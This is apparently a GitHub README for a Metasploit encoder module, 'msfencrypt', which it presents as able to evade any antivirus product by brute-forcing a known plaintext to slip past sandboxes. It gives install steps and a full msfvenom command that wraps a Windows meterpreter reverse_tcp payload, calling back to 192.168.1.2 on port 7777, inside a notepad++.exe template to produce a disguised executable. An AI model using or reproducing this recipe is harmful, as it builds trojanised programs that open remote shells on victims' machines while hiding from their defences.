# Metasploit Encryption

This tool permit to evade any antivirus products.
It use a brute force attack on a known plain text to bypass the sandbox.

![alt tag](https://github.com/MrMugiwara/Metasploit-Encrypter/blob/master/msfencrypt.png)


# Installation
-----------

Copy msfencrypt.rb in metasploit/modules/encoders/x86/

# Usage
-----------

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=7777 -f raw -x notepad++.exe -f exe-only -e x86/msfencrypt -o output.exe

